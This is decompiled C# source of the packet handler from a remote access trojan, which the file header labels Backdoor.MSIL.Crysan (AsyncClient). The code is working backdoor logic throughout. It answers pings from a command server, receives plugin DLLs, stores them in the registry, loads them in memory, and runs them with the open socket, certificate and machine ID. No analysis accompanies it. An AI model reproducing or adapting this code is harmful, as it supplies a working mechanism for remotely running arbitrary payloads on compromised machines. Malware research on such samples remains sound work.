// Decompiled with JetBrains decompiler
// Type: Client.Handle_Packet.Packet
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.MSIL.Crysan.ecy-6bb030430aef2b33ca1f8db61690c001754e9c2dae78e22b11a178959cd4c7a2.exe

using Client.Connection;
using Client.Helper;
using MessagePackLib.MessagePack;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Client.Handle_Packet
{
  public static class Packet
  {
    public static List<MsgPack> Packs = new List<MsgPack>();

    public static void Read(object data)
    {
      try
      {
        MsgPack unpack_msgpack = new MsgPack();
        unpack_msgpack.DecodeFromBytes((byte[]) data);
        switch (unpack_msgpack.ForcePathObject(nameof (Packet)).AsString)
        {
          case "pong":
            ClientSocket.ActivatePong = false;
            MsgPack msgPack1 = new MsgPack();
            msgPack1.ForcePathObject(nameof (Packet)).SetAsString("pong");
            msgPack1.ForcePathObject("Message").SetAsInteger((long) ClientSocket.Interval);
            ClientSocket.Send(msgPack1.Encode2Bytes());
            ClientSocket.Interval = 0;
            break;
          case "plugin":
            try
            {
              if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null)
              {
                Packet.Packs.Add(unpack_msgpack);
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject(nameof (Packet)).SetAsString("sendPlugin");
                msgPack2.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                ClientSocket.Send(msgPack2.Encode2Bytes());
                break;
              }
              Packet.Invoke(unpack_msgpack);
              break;
            }
            catch (Exception ex)
            {
              Packet.Error(ex.Message);
              break;
            }
          case "savePlugin":
            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
            using (List<MsgPack>.Enumerator enumerator = Packet.Packs.ToList<MsgPack>().GetEnumerator())
            {
              while (enumerator.MoveNext())
              {
                MsgPack current = enumerator.Current;
                if (current.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                {
                  Packet.Invoke(current);
                  Packet.Packs.Remove(current);
                }
              }
              break;
            }
        }
      }
      catch (Exception ex)
      {
        Packet.Error(ex.Message);
      }
    }

    private static void Invoke(MsgPack unpack_msgpack)
    {
      object instance = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin"));
      // ISSUE: reference to a compiler-generated field
      if (Packet.\u003C\u003Eo__2.\u003C\u003Ep__0 == null)
      {
        // ISSUE: reference to a compiler-generated field
        Packet.\u003C\u003Eo__2.\u003C\u003Ep__0 = CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", (IEnumerable<Type>) null, typeof (Packet), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[9]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      Packet.\u003C\u003Eo__2.\u003C\u003Ep__0.Target((CallSite) Packet.\u003C\u003Eo__2.\u003C\u003Ep__0, instance, ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
      Packet.Received();
    }

    private static void Received()
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject(nameof (Packet)).AsString = nameof (Received);
      ClientSocket.Send(msgPack.Encode2Bytes());
      Thread.Sleep(1000);
    }

    public static void Error(string ex)
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject(nameof (Packet)).AsString = nameof (Error);
      msgPack.ForcePathObject(nameof (Error)).AsString = ex;
      ClientSocket.Send(msgPack.Encode2Bytes());
    }
  }
}
